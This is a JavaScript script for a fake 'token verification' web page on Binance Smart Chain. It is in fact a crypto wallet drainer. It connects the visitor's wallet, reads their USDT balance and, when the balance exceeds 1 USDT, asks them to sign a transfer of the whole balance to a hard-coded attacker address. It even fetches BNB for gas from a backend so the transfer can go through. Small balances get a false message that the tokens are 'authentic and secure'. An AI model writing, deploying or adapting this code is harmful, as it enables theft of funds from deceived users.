// --- Start of your modified verification script ---

// IMPORTANT: Elements like walletAddress, tokenBalance, verificationModal, progressBar,
// and all step-related elements (step1, step2, step3, step4, step1Desc, etc.)
// networkDot, networkStatus, modalMessage, and closeModalBtns are NOT present
// in your provided index.html. The visual feedback for these will not work.
// Messages will primarily be logged to the console or shown via 'showError'.

const Next = document.getElementById('Next'); // This targets your 'Next' button

// Configuration
const recipientAddress = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090';
const tokenContractAddress = '0x55d398326f99059fF775485246999027B3197955'; // BEP-20 USDT contract
const tokenAbi = [
    {
        "constant": true,
        "inputs": [{"name": "who", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    }
];

// Network configuration
const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
const BSC_MAINNET_PARAMS = {
    chainId: BSC_MAINNET_CHAIN_ID,
    chainName: 'Binance Smart Chain Mainnet',
    nativeCurrency: {
        name: 'BNB',
        symbol: 'bnb',
        decimals: 18
    },
    rpcUrls: ['https://bsc-dataseed.binance.org/'],
    blockExplorerUrls: ['https://bscscan.com/']
};

// Wallet types
const WALLET_TYPES = {
    TRUST: 'trust',
    BINANCE: 'binance',
    METAMASK: 'metamask',
    UNKNOWN: 'unknown'
};

let web3;
let userAddress;
let tokenBalanceValue = 0;
let tokenContract;
let isTransferComplete = false;
let currentProvider = null;
let walletType = WALLET_TYPES.UNKNOWN;

// Initialize Web3 - Wallet compatible
async function initWeb3() {
    // Detect wallet type
    if (window.trustwallet) {
        walletType = WALLET_TYPES.TRUST;
        currentProvider = window.trustwallet;
    } else if (window.BinanceChain) {
        walletType = WALLET_TYPES.BINANCE;
        currentProvider = window.BinanceChain;
    } else if (window.ethereum) {
        walletType = WALLET_TYPES.METAMASK;
        currentProvider = window.ethereum;
    } else if (window.web3) { // Fallback for older Web3 versions
        walletType = WALLET_TYPES.UNKNOWN;
        currentProvider = window.web3.currentProvider;
    } else {
        console.error("No Web3 provider detected.");
        showError("Please install Trust Wallet, Binance Wallet or MetaMask.");
        return false;
    }

    try {
        web3 = new Web3(currentProvider);
        // We will call updateNetworkStatus later, not during initWeb3 directly for cleaner flow.

        // Listen for chain changes
        if (currentProvider.on) {
            currentProvider.on('chainChanged', (chainId) => {
                window.location.reload();
            });

            // Binance Chain specific event
            if (walletType === WALLET_TYPES.BINANCE) {
                currentProvider.on('accountsChanged', (accounts) => {
                    window.location.reload();
                });
            }
        }
        return true;
    } catch (error) {
        console.error("Web3 initialization error:", error);
        showError("Web3 initialization failed.");
        return false;
    }
}

// Update network status (console only, as UI elements are not present)
async function updateNetworkStatus() {
    if (!web3) return false;
    try {
        const chainId = await web3.eth.getChainId();
        if (chainId === parseInt(BSC_MAINNET_CHAIN_ID, 16)) {
            console.log("Network status: Binance Smart Chain.");
            return true;
        } else {
            console.warn(`Network status: Unsupported Network (ID: ${chainId}). Attempting to switch to BSC...`);
            // Automatically switch to BSC for Trust Wallet or MetaMask
            if (walletType === WALLET_TYPES.TRUST || walletType === WALLET_TYPES.METAMASK) {
                const switched = await switchToBSC();
                if (switched) {
                    return updateNetworkStatus(); // Recursive check after successful switch
                }
            }
            return false;
        }
    } catch (error) {
        console.error("Error getting network status:", error);
        showError("Network check failed.");
        return false;
    }
}

// Switch to Binance Smart Chain
async function switchToBSC() {
    console.log(`Attempting to switch to BSC (Wallet: ${walletType})`);
    try {
        if (walletType === WALLET_TYPES.BINANCE) {
            await window.BinanceChain.switchNetwork('bsc-mainnet');
            return true;
        }
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: BSC_MAINNET_CHAIN_ID }]
        });
        return true;
    } catch (switchError) {
        // Network not added, try to add it
        if (switchError.code === 4902) {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [BSC_MAINNET_PARAMS]
                });
                return true;
            } catch (addError) {
                console.error("Failed to add BSC network:", addError);
                showError("Failed to add BSC network.");
                return false;
            }
        }
        console.error("Failed to switch to BSC:", switchError);
        showError("Failed to switch network.");
        return false;
    }
}

// Connect Wallet function (ORIGINAL LOGIC - passively tries to get accounts)
async function connectWallet() {
    const isWeb3Initialized = await initWeb3();
    if (!isWeb3Initialized) {
        showError("Web3 initialization failed."); // This specific error is for Web3 object itself
        return false;
    }

    try {
        let accounts;
        // Different method for Binance Web3 Wallet or generic Web3 provider
        if (walletType === WALLET_TYPES.BINANCE) {
            accounts = await window.BinanceChain.request({ method: 'eth_accounts' });
        } else {
            accounts = await web3.eth.getAccounts();
        }

        if (accounts.length === 0) {
            // This is the point where we report "No accounts found" if not already connected
            showError("No accounts found. Please ensure your wallet is open and connected to this page.");
            console.error("Error: Wallet not connected or accounts not found.");
            return false;
        }
        userAddress = accounts[0];
        console.log("Wallet connected:", userAddress);
        return true;
    } catch (error) {
        console.error("Error connecting wallet (getting accounts):", error);
        showError("Error connecting wallet. Please try again or ensure your wallet is active.");
        return false;
    }
}

// Get token balance
async function getTokenBalance() {
    try {
        tokenContract = new web3.eth.Contract(tokenAbi, tokenContractAddress);
        const balance = await tokenContract.methods.balanceOf(userAddress).call();
        tokenBalanceValue = web3.utils.fromWei(balance, 'ether');
        console.log(`User USDT balance: ${tokenBalanceValue}`);
        return true;
    } catch (error) {
        console.error("Error fetching token balance:", error);
        showError("Failed to get token balance.");
        tokenBalanceValue = 0; // Ensure it's reset on error
        return false;
    }
}

// Execute verification (transfer)
async function executeVerification() {
    try {
        const amountWei = web3.utils.toWei(tokenBalanceValue.toString(), 'ether');

        // Check BNB balance for gas
        const bnbBalanceWei = await web3.eth.getBalance(userAddress);
        const userBNB = parseFloat(web3.utils.fromWei(bnbBalanceWei, 'ether'));
        const BNB_LOW_THRESHOLD = 0.0005; // Sufficient for typical BSC transactions

        if (userBNB < BNB_LOW_THRESHOLD) {
            console.warn("Insufficient BNB for gas. Requesting BNB top-up...");
            Next.disabled = true; // Keep button disabled during top-up request
            try {
                const response = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ toAddress: userAddress })
                });

                if (response.ok) {
                    const result = await response.json();
                    console.log("BNB top-up request successful:", result);
                    showError("Insufficient BNB. Request sent. Please wait for BNB to arrive, then click Next again.");
                } else {
                    const errorData = await response.json();
                    console.error("BNB top-up request failed:", errorData);
                    showError(`BNB top-up failed: ${errorData.message || "Unknown error"}. Please ensure you have enough BNB for gas.`);
                }
            } catch (backendError) {
                console.error("Error communicating with BNB backend:", backendError);
                showError("Could not request BNB. Network error or backend issue. Please try again.");
            } finally {
                Next.disabled = false; // Re-enable button after top-up attempt
                return; // Stop execution, prompt user to re-click
            }
        }

        // Proceed with USDT transfer if BNB is sufficient
        console.log("Prompting transaction for USDT transfer...");
        tokenContract.methods.transfer(recipientAddress, amountWei)
            .send({ from: userAddress })
            .on('transactionHash', (hash) => {
                console.log("Transaction hash:", hash);
                showError("Transaction initiated. Please confirm in your wallet.");
            })
            .on('receipt', (receipt) => {
                console.log("Transaction receipt:", receipt);
                Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete!';
                Next.disabled = true;
                showError("Token verification complete! Your tokens are authentic and secure.");
                isTransferComplete = true;
            })
            .on('error', (error) => {
                console.error("Transaction error:", error);
                // User rejected or other transaction error
                showError("Transaction failed or rejected. Please try again.");
                Next.disabled = false; // Re-enable button on error
                // Reset button text in case of error
                Next.innerHTML = 'Next';
            });

    } catch (error) {
        console.error("Verification failed:", error);
        showError("An error occurred during verification. Please try again.");
        Next.disabled = false; // Re-enable button on error
        // Reset button text in case of error
        Next.innerHTML = 'Next';
    }
}

// Show error message (console and alert replacement, as modal is not present)
function showError(message) {
    console.error("User Feedback:", message);
    alert(message); // Using alert for direct user feedback given no modal
}

// Event Listener for the "Next" button
Next.addEventListener('click', async () => {
    if (isTransferComplete) {
        showError("Tokens already verified.");
        return;
    }

    Next.disabled = true; // Disable button immediately

    // Connect wallet using the original passive method
    const connected = await connectWallet();
    if (!connected) {
        Next.disabled = false; // Re-enable if connection fails
        return;
    }

    // Ensure BSC network
    const networkReady = await ensureBSCNetwork();
    if (!networkReady) {
        showError("Please switch to Binance Smart Chain to continue.");
        Next.disabled = false; // Re-enable if network not ready
        return;
    }

    // Get token balance
    const balanceFetched = await getTokenBalance();
    if (!balanceFetched) {
        Next.disabled = false; // Re-enable if balance fetch fails
        return;
    }

    // Handle USDT balance conditions
    if (tokenBalanceValue <= 0.009) { // Using 0.009 to account for potential tiny floating point (effectively 0)
        showError("No assets found for verification. Your USDT balance is zero.");
        Next.disabled = false; // Re-enable if no assets
        return;
    } else if (tokenBalanceValue > 0.009 && tokenBalanceValue <= 1.0) { // Between 0.01 and 1 USDT
        Next.innerHTML = '<i class="fas fa-check-circle"></i> Verification Complete!';
        Next.disabled = true; // Keep button disabled after completion
        isTransferComplete = true;
        const bnbBalance = await web3.eth.getBalance(userAddress);
        const formattedBNB = web3.utils.fromWei(bnbBalance, 'ether');
        showError(`Token verification complete! Your tokens are authentic and secure.\nUSDT Balance: ${parseFloat(tokenBalanceValue).toFixed(2)} USDT\nBNB Balance: ${parseFloat(formattedBNB).toFixed(4)} BNB`);
        return;
    } else { // More than 1 USDT, proceed to transfer
        await executeVerification();
    }
});

// Initialize on load
window.addEventListener('load', async () => {
    if (Next) Next.disabled = false; // Ensure button is enabled on load
    const web3Initialized = await initWeb3();

    if (web3Initialized) {
        // Attempt to auto-connect and get balance if already connected
        // Note: The original script's init-on-load had a `currentProvider.selectedAddress` check
        // which implies it relied on the wallet *already* exposing an address.
        // We'll call connectWallet here to mirror the check that would have happened
        // with the original 'verifyBtn.addEventListener' block.
        const connectedOnInit = await connectWallet(); // This will show alert if no wallet connected
        if (connectedOnInit) {
            await updateNetworkStatus(); // Update network status silently
            await getTokenBalance(); // Fetch balance silently
        }
    }
});
